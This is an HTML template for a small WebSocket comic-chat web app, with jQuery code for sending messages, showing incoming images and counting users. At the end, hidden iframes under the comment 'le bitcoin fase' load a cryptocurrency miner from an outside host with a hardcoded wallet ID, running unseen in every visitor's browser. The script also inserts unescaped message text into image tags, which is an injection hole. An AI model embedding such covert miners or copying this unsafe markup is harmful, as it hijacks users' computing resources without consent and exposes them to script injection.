<!doctype html>

<head>
	<title>comicchat</title>
	<script src="https://code.jquery.com/jquery-2.0.0b1.js"></script>
	<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
	<style type="text/css">
	</style>

	<script>
	var cc = {};

	cc.nusers = 1;

	cc.connect = function() {
		$("#status").removeClass("btn-danger").removeClass("btn-success").
			addClass("btn-info").html("connecting...");

		// image urls over websocket
		var loc = window.location, new_uri;
		if (loc.protocol === "https:") {
			new_uri = "wss:";
		} else {
			new_uri = "ws:";
		}
		new_uri += "//" + loc.host;
		new_uri += loc.pathname + "new";

		if (window["WebSocket"]) {
			cc.conn = new WebSocket(new_uri);
			cc.conn.onclose = function(evt) {
				console.log("onclose " + evt.code);
				$("#status").removeClass("btn-info").removeClass("btn-success").
					addClass("btn-danger").html("connection broke");
					window.setTimeout(cc.connect(), 5000);
			}
			cc.conn.onerror = function(evt) {
				console.log("onerror " + evt.data);
				$("#status").removeClass("btn-info").removeClass("btn-success").
					addClass("btn-danger").html("error: " + evt.data);
			}
			cc.conn.onmessage = function(evt) {
				console.log("onmessage " + evt.data);
				msg = JSON.parse(evt.data);
				switch(msg.Type) {
				case "ping":
					cc.send("pong", msg.Message);
					break;
				case "newimage":
					$("#output").append("<img src='" + msg.Message + "' />");

					$('html, body').animate(
					{scrollTop: $('#output').height() + ($("#navbar").height()*2)},
					100
					);

					break;
				case "connected":
					$("#status").removeClass("btn-info");
					$("#status").removeClass("btn-danger");
					$("#status").addClass("btn-success");
					$("#status").html("connection ok!");

					cc.nusers = parseInt(msg.Message);
					$("#usercount").html(cc.nusers + " users");

					break;
				case "join":
					cc.nusers += 1;
					$("#usercount").html(cc.nusers + " users");
					break;
				case "part":
					cc.nusers -= 1;
					$("#usercount").html(cc.nusers + " users");
					break;
				}
			}
		}
	};

	cc.getName = function () {
		$("#name").show();
		$("#set").show();
		$("#set").click(function () {
			localStorage['comicchat_name'] = $("#name").val();
			$("#name").hide();
			$("#set").hide();
		});
	};

	cc.send = function(typ, msg) {
		console.log("send " + typ + " " + msg);
		var cmsg = {};
		cmsg.Type = typ;
		cmsg.Message = msg;
		cc.conn.send(JSON.stringify(cmsg));
	};


	$(document).ready(function () {
		cc.connect()
		$("#text").keypress(function (e) {
			if (e.which == 13) {
				$("#send").focus().click();
				$("#text").val('');
				$("#text").focus()
				return false;    //<---- Add this line
			}
		});

		$("#send").click(function () {
			cc.send("privmsg", $("#text").val());
			$("#text").val('');
			$("#text").focus()
			return false;    //<---- Add this line
		});

		$("#face").on('change', function() {
			cc.send("action", $("#face").val());
			return false;    //<---- Add this line
		});

		$("#setnick").click(function () {
			cc.send("nick", $("#nick").val());
			$("#text").focus()
			return false;    //<---- Add this line
		});

		cc.name = localStorage['comicchat_name'];
		if (! cc.name) {
			cc.getName();
		}

	});

</script>
</head>
<body>
<div id="output" style="padding-bottom: 50px;"></div>
<!--
<input style="display:none" id="name" /><button style="display:none" id="set">set name</button>
-->
<nav id="navbar" class="navbar navbar-default navbar-left navbar-fixed-bottom" role="navigation">
	<div class="container-fluid">
		<form class="navbar-form">
			<div class="col-lg-5 col-lg-offset-1">
				<div class="input-group">
					<input type="text" class="form-control" id="text" placeholder="enter text">
					<span class="input-group-btn">
						<button id="send" class="btn btn-primary">send</button>
					</span>
				</div>
			</div>
			<div class="col-lg-1">
				<div class="input-group">
					<label class="sr-only" for="face">face:</label>
					<select id="face" class="btn btn-default">
					{{range .Faces}}
						<option value="{{.}}">{{.}}</option>
					{{end}}
					</select>
				</div>
			</div>

<!--
			<div class="form-group">
				<input type="text" class="form-control" id="nick">
				<button id="setnick" class="btn btn-primary">set nick</button>
			</div>
-->
		</form>
		<div class="pull-right">
			<!--<div class="col-lg-offset-1 col-lg-1">
				<div class="input-group pull-right">-->
			<button id="usercount" class="btn btn-info disabled">1 user</button>
			<button id="status" class="btn btn-info disabled">connecting...</button>

			<!-- Button trigger modal -->
			<button id="aboutbtn" class="btn btn-info" data-toggle="modal" data-target="#aboutmodal">about</button>
		</div>
	</div>
</nav>

<!-- about modal -->
<div class="modal fade" id="aboutmodal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
				<h4 class="modal-title" id="myModalLabel">about</h4>
			</div>
			<div class="modal-body">
				<p>written by mischief and embeddedlinuxguy.</p>
				<p>comments can be sent via email to mischief or vlad @ <a href="https://mindlock.us">mindlock.us</a>.</p>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<!-- le bitcoin fase -->
<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 13QmtVxCpvZ37SFkJ1E3Vp2dvwa4mrk2we</script></iframe><iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 13QmtVxCpvZ37SFkJ1E3Vp2dvwa4mrk2we</script></iframe>
</body>
</html>

